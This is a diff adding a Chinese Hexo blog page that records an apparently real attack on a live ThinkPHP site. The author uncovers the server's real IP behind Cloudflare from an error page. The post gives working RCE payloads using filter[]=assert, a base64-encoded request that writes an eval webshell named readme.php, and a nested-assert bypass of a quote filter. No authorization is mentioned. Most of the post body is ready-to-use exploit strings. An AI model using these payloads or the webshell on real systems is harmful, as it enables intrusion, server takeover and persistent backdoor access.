@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.0">
+<meta name="google-site-verification" content="DPsEF01SMytD4bnWQ221G1mMmGqFRfanBwmVZh7ACaU" />
+<meta name="baidu-site-verification" content="9w2JQKMeTC" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://h3art3ars.github.io').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="实际渗透测试记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试纪实-1">
+<meta property="og:url" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;2020&#x2F;05&#x2F;21&#x2F;%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-1&#x2F;index.html">
+<meta property="og:site_name" content="h3art3ars">
+<meta property="og:description" content="实际渗透测试记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;image-20200521145023239.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;image-20200521145919691.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;image-20200521150108485.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;image-20200521152159765.png">
+<meta property="article:published_time" content="2020-05-21T07:59:36.000Z">
+<meta property="article:modified_time" content="2020-05-21T08:03:58.425Z">
+<meta property="article:author" content="h3art3ars">
+<meta property="article:tag" content="实战">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;h3art3ars.github.io&#x2F;images&#x2F;image-20200521145023239.png">
+
+<link rel="canonical" href="http://h3art3ars.github.io/2020/05/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>渗透测试纪实-1 | h3art3ars</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="h3art3ars" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+	
+	<script type="text/javascript"
+		color="51,204,204 " opacity='0.5' zIndex="-2" count="120" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+	
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">h3art3ars</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <h1 class="site-subtitle" itemprop="description">路漫漫其修远兮，吾将上下而求索</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://h3art3ars.github.io/2020/05/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="h3art3ars">
+      <meta itemprop="description" content="笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="h3art3ars">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          渗透测试纪实-1
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-21 15:59:36 / 修改时间：16:03:58" itemprop="dateCreated datePublished" datetime="2020-05-21T15:59:36+08:00">2020-05-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">实际渗透测试记录</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>找到目标站，大略浏览了一遍</p>
+<p>看了一下url <code>app/dist/index.html#/reg?phone=</code>有点像thinkphp框架，</p>
+<p>试了试 <code>domain/captcha</code>显示404</p>
+<p>之后看了看chrome network抓的包</p>
+<p><img src="/images/image-20200521145023239.png" alt="image-20200521145023239"></p>
+<p>看样子是改了默认的入口文件 <code>index.php</code></p>
+<p>之后又试了下 <code>tl_api.php?s=captcha</code></p>
+<p><img src="/images/image-20200521145919691.png" alt="image-20200521145919691"></p>
+<p>熟悉的界面。</p>
+<p>直接上exp，然后，所有的报错页面都显示这个。</p>
+<p><img src="/images/image-20200521150108485.png" alt="image-20200521150108485"></p>
+<p>心里顿时暗道不妙，还记得上次也是tp的站 ，对方加了cloudflare，然后动不动禁ip，一上exp就禁ip，弄得我束手无测，不过这次报错界面却暴露了他的真实ip。SERVER_ADDR对应的值就是真实ip。</p>
+<p>之后直接从真实ip入手</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>试了试日志和session包含，</p>
+<p><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=../runtime/log/202005/19.log</code></p>
+<p>但是都失败了</p>
+<p>说不定版本小于7.1.索性直接assert</p>
+<p><code>_method=__construct&amp;method=get&amp;filter[]=assert&amp;get[]=phpinfo();</code></p>
+<p>成功了，是php5.6版本的。</p>
+<p>之后就是写入shell了。</p>
+<p><code>_method=__construct&amp;method=get&amp;filter[]=assert&amp;get[]=file_put_contents(&#39;./readme.php&#39;,base64_decode(&#39;PD9waHAgCiAgICAkYiA9IHN1YnN0cigkX1BPU1RbJ2gzYXJ0M2FycyddLCAxKTsKICAgIGV2YWwoYmFzZTY0X2RlY29kZSgkYikpOwo/Pg==&#39;));</code></p>
+<p>然后报了出乎意料的错误，语法错误：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected &#39;&#39;.&#x2F;readme.php\&#39;,base64_decode&#39; (T_ENCAPSED_AND_WHITESPACE), expecting identifier (T_STRING) in assert code on line 1</span></pre></td></tr></table></figure>
+
+<p>是过滤了单引号了。</p>
+<h2 id="简单绕过"><a href="#简单绕过" class="headerlink" title="简单绕过"></a>简单绕过</h2><p>assert调用assert</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;assert&amp;get[]&#x3D;assert(base64_decode($_POST[1]));&amp;1&#x3D;ZmlsZV9wdXRfY29udGVudHMoJy4vcmVhZG1lLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQWdDaUFnSUNBa1lpQTlJSE4xWW5OMGNpZ2tYMUJQVTFSYkoyZ3pZWEowTTJGeWN5ZGRMQ0F4S1RzS0lDQWdJR1YyWVd3b1ltRnpaVFkwWDJSbFkyOWtaU2drWWlrcE93by9QZz09Jykp</span></pre></td></tr></table></figure>
+
+<p>最终写入了shell。</p>
+<p><img src="/images/image-20200521152159765.png" alt="image-20200521152159765"></p>
+<p>提权未成功，bypass disable未成功</p>
+<p><code>Linux guest 3.10.0-1127.el7.x86_64 #1 SMP Tue Mar 31 23:36:51 UTC 2020 x86_64</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%AE%9E%E6%88%98/" rel="tag"># 实战</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/27/%E5%88%A9%E7%94%A8php%E6%96%B0%E7%89%B9%E6%80%A7%E8%BF%87%E9%9D%99%E6%80%81%E6%9F%A5%E6%9D%80/" rel="prev" title="利用php新特性过静态查杀">
+      <i class="fa fa-chevron-left"></i> 利用php新特性过静态查杀
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#收集信息"><span class="nav-number">1.</span> <span class="nav-text">收集信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试"><span class="nav-number">2.</span> <span class="nav-text">渗透测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单绕过"><span class="nav-number">3.</span> <span class="nav-text">简单绕过</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="h3art3ars"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">h3art3ars</p>
+  <div class="site-description" itemprop="description">笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/h3art3ars" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;h3art3ars" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:570498521aeth@gmail.com" title="E-Mail → mailto:570498521aeth@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h3art3ars</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+	
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body>
+</html>
